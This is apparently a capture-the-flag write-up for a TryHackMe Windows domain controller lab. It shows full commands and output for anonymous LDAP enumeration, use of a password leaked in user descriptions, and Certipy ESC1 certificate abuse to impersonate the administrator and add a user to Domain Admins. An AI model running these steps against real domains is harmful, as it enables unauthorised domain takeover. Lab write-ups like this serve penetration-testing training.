# Ledger

![Ledger screenshot](img/image.png)
### ADCS ESC1 to Domain Admin

A Windows Active Directory box where an anonymous SMB null session opens the door to LDAP enumeration, a password leaked in a user object gives us a foothold, and a misconfigured certificate template (ESC1) turns that foothold into Domain Admin — without ever cracking a single hash.

| **Platform** | TryHackMe |
| --- | --- |
| **Host** | `labyrinth.thm.local` |
| **Domain** | `thm.local` |
| **OS** | Windows Server 2019 (Build 17763) |
| **Target IP** | `10.49.166.18`  |
| **Key vulns** | Anonymous SMB/LDAP access, cleartext credentials in AD, ADCS ESC1 |

---

### -Attack Path

```
Anonymous SMB null session
        │
        ▼
LDAP user enumeration as guest ──► cleartext password in user object
        │
        ▼
Valid domain credentials (IVY_WILLIS / SUSANNA_MCKNIGHT)
        │
        ▼
certipy-ad find ──► ESC1 on the "ServerAuth" template
        │
        ▼
Request certificate with UPN = administrator ──► administrator.pfx
        │
        ▼
PKINIT auth via LDAP shell ──► add IVY_WILLIS to Domain Admins
        │
        ▼
RDP as a Domain Admin ──► game over
```

---

### -Nmap

```bash
nmap -sV -sC -A -p- --min-rate 1000 10.49.166.18 
```

```
ORT      STATE SERVICE       VERSION
Open 10.49.166.18:53
Open 10.49.166.18:80
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-22 13:03:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-22T13:04:23+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
|_SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-22T13:04:23+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
|_SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
|_SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
|_ssl-date: 2026-08-22T13:04:23+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-22T13:04:23+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
|_SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Issuer: commonName=labyrinth.thm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-21T13:02:15
| Not valid after:  2027-02-20T13:02:15
| MD5:     bc45 c5cd 2f26 a69d a2f3 051a 0524 1da4
| SHA-1:   ede4 6181 6732 2a07 ce74 fc89 c1c1 55b3 3a12 2f86
|_SHA-256: 754b cbde 7892 159c 6170 2963 9624 1f61 b739 94fc 736c 89a4 2dd5 3f65 a636 e579
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: LABYRINTH
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: labyrinth.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-22T13:04:15+00:00
|_ssl-date: 2026-08-22T13:04:23+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
```

A few things jump out immediately:

- **53 / 88 / 389 / 445 / 636** confirm this is a **Domain Controller**.
- The LDAP certificate reveals both the NetBIOS domain (`THM`) and the FQDN `labyrinth.thm.local`.
- `3389` gives us a place to land once we have admin rights.

Add the host to `/etc/hosts`:

```bash
echo "10.49.166.18 labyrinth.thm.local thm.local" | sudo tee -a /etc/hosts
```

---

## -SMB Enumeration

```bash
nxc smb 10.49.166.18 -u 'guest' -p '' --shares
```

```
SMB  10.49.166.18  445  LABYRINTH  [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.49.166.18  445  LABYRINTH  [+] thm.local\guest:
SMB  10.49.166.18  445  LABYRINTH  [*] Enumerated shares
SMB  10.49.166.18  445  LABYRINTH  Share           Permissions     Remark
SMB  10.49.166.18  445  LABYRINTH  -----           -----------     ------
SMB  10.49.166.18  445  LABYRINTH  ADMIN$                          Remote Admin
SMB  10.49.166.18  445  LABYRINTH  C$                              Default share
SMB  10.49.166.18  445  LABYRINTH  IPC$            READ            Remote IPC
SMB  10.49.166.18  445  LABYRINTH  NETLOGON                        Logon server share
SMB  10.49.166.18  445  LABYRINTH  SYSVOL                          Logon server share
```

`Null Auth: True` and a successful `guest` logon confirm anonymous access is allowed. Share permissions for `guest` only give `READ` on `IPC$`, so there is nothing juicy to pull from SYSVOL/NETLOGON

## -LDAP Enumeration

Because the domain permits anonymous binds, we can enumerate users without any credentials at all.

```bash
nxc ldap 10.49.166.18 -u 'guest' -p '' --users
```

```
LDAP  10.49.166.18  389  LABYRINTH  [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local) (signing:None) (channel binding:Never)
LDAP  10.49.166.18  389  LABYRINTH  [+] thm.local\guest:
LDAP  10.49.166.18  389  LABYRINTH  [*] Enumerated domain users: thm.local
LDAP  10.49.166.18  389  LABYRINTH  -Username-             -Last PW Set-       -BadPW-  -Description-
LDAP  10.49.166.18  389  LABYRINTH  Guest                  <never>             0        Tier 1 User
LDAP  10.49.166.18  389  LABYRINTH  greg                   2023-05-15 20:19:03 0        Tier 1 User
LDAP  10.49.166.18  389  LABYRINTH  SHANA_FITZGERALD       2023-05-30 15:15:58 0
LDAP  10.49.166.18  389  LABYRINTH  CAREY_FIELDS           2023-05-30 15:15:58 0
...
```

LDAP user enumeration

Scrolling through the output, two user objects stand out — their **description** field contains what looks a lot like a password:

![image.png](Ledger/image%201.png)

```
IVY_WILLIS:CHANGEME2023!
SUSANNA_MCKNIGHT:CHANGEME2023!
```

A password in an AD user description is an alarmingly common real-world finding: it is readable by any authenticated (or, here, anonymous) user, and it is frequently the actual account password because admins treat the field as a notepad.

Before trusting it, validate the credentials and see whether they unlock more than `guest` did:

```bash
nxc smb 10.49.166.18 -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' --shares
```

```
SMB  10.49.166.18  445  LABYRINTH  [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
SMB  10.49.166.18  445  LABYRINTH  [*] Enumerated shares
SMB  10.49.166.18  445  LABYRINTH  Share           Permissions     Remark
SMB  10.49.166.18  445  LABYRINTH  -----           -----------     ------
SMB  10.49.166.18  445  LABYRINTH  ADMIN$                          Remote Admin
SMB  10.49.166.18  445  LABYRINTH  C$                              Default share
SMB  10.49.166.18  445  LABYRINTH  IPC$            READ            Remote IPC
SMB  10.49.166.18  445  LABYRINTH  NETLOGON        READ            Logon server share
SMB  10.49.166.18  445  LABYRINTH  SYSVOL          READ            Logon server share
```

---

## -ADCS Enumeration

Active Directory Certificate Services is one of the highest-impact attack surfaces in modern AD environments. Enumerate it with Certipy:

```bash
certipy-ad find \
  -u 'IVY_WILLIS@THM.LOCAL' \
  -p 'CHANGEME2023!' \
  -dc-ip 10.49.166.18 \
  -vulnerable
```

Certipy writes a report (`<timestamp>_Certipy.txt`) and a JSON file. The CA configuration itself looks fairly standard:

```
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Enforce Encryption for Requests     : Enabled
```

But one published template is badly broken:

```
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
    [+] User Enrollable Principals      : THM.LOCAL\Authenticated Users
                                          THM.LOCAL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

---

### -Exploiting ESC1

Request a certificate from the `ServerAuth` template, overriding the UPN to `administrator@THM.LOCAL`:

```bash
certipy-ad req \
  -u 'IVY_WILLIS@THM.LOCAL' \
  -p 'CHANGEME2023!' \
  -ca 'thm-LABYRINTH-CA' \
  -template 'ServerAuth' \
  -upn 'administrator@THM.LOCAL' \
  -dc-ip 10.49.166.18 \
  -target 10.49.166.18 \
  -debug
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@THM.LOCAL'
[*] Saved certificate and private key to 'administrator.pfx'
```

We now hold a `.pfx` containing a certificate whose subject is the Domain Administrator. Note that this is a **certificate**, not a password — nothing was cracked, and no administrator secret was ever touched.

---

### -Authenticating with the Certificate

Use the certificate to authenticate via Kerberos PKINIT. Certipy can drop straight into an LDAP shell with the privileges of the impersonated account:

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.49.166.18 \
  -domain THM.LOCAL \
  -ldap-shell
```

```
[*] Connecting to LDAP server...
[*] Authenticating to 10.49.166.18 as administrator@THM.LOCAL using certificate...
[*] Authenticated to 10.49.166.18 as: u:THM.LOCAL\Administrator
Type help for list of commands
#
```

The prompt confirms it: we are now operating as `THM.LOCAL\Administrator`.

---

## -Privilege Escalation:Adding a User to Domain Admins

Rather than working exclusively through the certificate, the cleaner move is to grant our existing, known-password account persistent Domain Admin rights. From the LDAP shell:

```
add_user_to_group IVY_WILLIS "Domain Admins"
add_user_to_group IVY_WILLIS "Remote Desktop Users"
add_user_to_group IVY_WILLIS "Administrators"
add_user_to_group IVY_WILLIS "Enterprise Admins"
add_user_to_group IVY_WILLIS "Group Policy Creator Owners"
```

In a real engagement you would add the **minimum** group membership required for the objective. Adding to every privileged group is noisy, damaging, and easy to detect — here it is done for convenience only.

Verify the new group membership:

```bash
nxc smb 10.49.166.18 -u 'IVY_WILLIS' -p 'CHANGEME2023!' --groups
```

At this point `IVY_WILLIS` is a Domain Admin with a password we already know, so we no longer depend on the certificate.

---

## -Landing on the Box with RDP

`IVY_WILLIS` is now in `Remote Desktop Users`, so connect over RDP:

```bash
xfreerdp /u:IVY_WILLIS /p:'CHANGEME2023!' /v:10.49.166.18 /cert:ignore /dynamic-resolution
```

Alternatively, use the certificate for a pass-the-certificate style logon:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.49.166.18 -domain THM.LOCAL
```

---

## Tools Used

- [nmap](https://nmap.org/)
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec)
- [Certipy](https://github.com/ly4k/Certipy)
- [xfreerdp](https://www.freerdp.com/)
